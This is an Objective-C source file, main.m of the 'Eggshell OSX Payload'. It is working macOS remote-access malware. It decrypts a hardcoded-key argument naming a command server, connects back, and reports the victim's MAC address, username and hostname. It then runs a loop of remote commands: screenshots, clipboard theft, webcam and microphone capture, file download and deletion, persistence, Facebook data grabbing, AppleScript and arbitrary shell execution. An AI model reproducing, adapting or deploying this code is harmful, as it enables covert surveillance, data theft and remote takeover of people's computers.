//
//  main.m
//  Eggshell OSX Payload
//
//  Created by Lucas Jackson on 8/23/16.
//  Copyright © 2016 Lucas Jackson. All rights reserved.
//
#import <Foundation/Foundation.h>
#import <sys/socket.h>
#import "AppKit/AppKit.h"
#import "espl.h"
NSString *bkey = @"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV";
espl *_espl;

//MARK: Main
//log with this
//system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",@"1"] UTF8String]);

int main(int argc, const char * argv[]) {
    _espl = [[espl alloc] init];
    if (argc == 1) { return 0; }
    //decrypt argument with shared key
    NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
    argument = [escryptor decryptB64ToNSString:bkey :argument];
    NSArray *args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
    int success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
    _espl.skey = args[2];
    _espl.terminator = [args[3] substringToIndex:16];
    if (success == -1) {
        NSLog(@"couldnt establish connection %s %s %s",argv[1],argv[2],argv[3]);
    }
    else {
        //send mac address, username@host info to server
        NSString *systeminfo = [NSString stringWithFormat:@"%@ %@@%@",[_espl GetMACAddressDisplayString],NSUserName(),[[NSHost currentHost] localizedName]];
        [_espl sendString:systeminfo];
        
        //shell
        NSString *command = @"";
        char buffer[2048];
        while (read (sockfd, &buffer, sizeof(buffer))) {
            @autoreleasepool {
                //decrypt received data
                command = [escryptor decryptB64ToNSString:_espl.skey :
                           [NSString stringWithFormat:@"%s",buffer]];
                //json decode
                NSError *decodeError = nil;
                NSDictionary *receivedDictionary = [NSJSONSerialization JSONObjectWithData: [command dataUsingEncoding:NSUTF8StringEncoding]
                                                                     options: NSJSONReadingAllowFragments
                                                                       error: &decodeError];
                if (decodeError != nil) {
                    system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",command] UTF8String]);
                    [_espl sendString:[NSString stringWithFormat:@"%@",decodeError]];
                }
                
                //assign
                NSString *cmd = [receivedDictionary objectForKey:@"cmd"];
                NSString *cmdArgument = [receivedDictionary objectForKey:@"args"];
                _espl.terminator = [receivedDictionary objectForKey:@"term"];
                
                if ([cmd isEqualToString: @"exit"]) {
                    exit(0);
                }
                else if ([cmd isEqualToString: @"getpid"]) {
                    [_espl getPid];
                }
                else if ([cmd isEqualToString: @"screenshot"]) {
                    [_espl screenshot];
                }
                else if ([cmd isEqualToString: @"getpaste"]) {
                    [_espl getPaste];
                }
                else if ([cmd isEqualToString: @"idletime"]) {
                    [_espl idleTime];
                }
                else if ([cmd isEqualToString: @"brightness"]) {
                    [_espl set_brightness:cmdArgument];
                }
                else if ([cmd isEqualToString: @"ls"]) {
                    printf("key = %s\n",[_espl.skey UTF8String]);
                    [_espl directoryList:cmdArgument];
                }
                else if ([cmd isEqualToString: @"cd"]) {
                    [_espl changeWD:cmdArgument];
                }
                else if ([cmd isEqualToString: @"rm"]) {
                    [_espl rmFile:cmdArgument];
                }
                else if ([cmd isEqualToString: @"pwd"]) {
                    [_espl sendString:_espl.fileManager.currentDirectoryPath];
                }
                else if ([cmd isEqualToString: @"download"]) {
                    [_espl download:cmdArgument];
                }
                else if ([cmd isEqualToString: @"picture"]) {
                    [_espl takePicture];
                }
                else if ([cmd isEqualToString: @"mic"]) {
                    [_espl mic:cmdArgument];
                }
                else if ([cmd isEqualToString: @"openurl"]) {
                    [_espl openURL:cmdArgument];
                }
                else if ([cmd isEqualToString: @"persistence"]) {
                    [_espl persistence:args[0]:args[1]];
                }
                else if ([cmd isEqualToString: @"rmpersistence"]) {
                    [_espl removePersistence:args[0]:args[1]];
                }
                else if ([cmd isEqualToString: @"getfacebook"]) {
                    [_espl getFacebook];
                }
                else if ([cmd isEqualToString: @"upload"]) { //still need to do this
                    [_espl receiveFile:cmd];
                }
                else if ([cmd isEqualToString: @"esrunosa"]) {
                    [_espl runAppleScript:cmdArgument];
                }
                else {
                    if ([cmd isEqualToString:@"endtask"]) {
                        [_espl runtask:cmd];
                    }
                    else {
                        [_espl runtask:[NSString stringWithFormat:@"%@ %@",cmd,cmdArgument]];
                    }
                }
                //clear the received data
                memset(buffer,'\0',2048);
            }
        }
    }
    
    return 0;
}

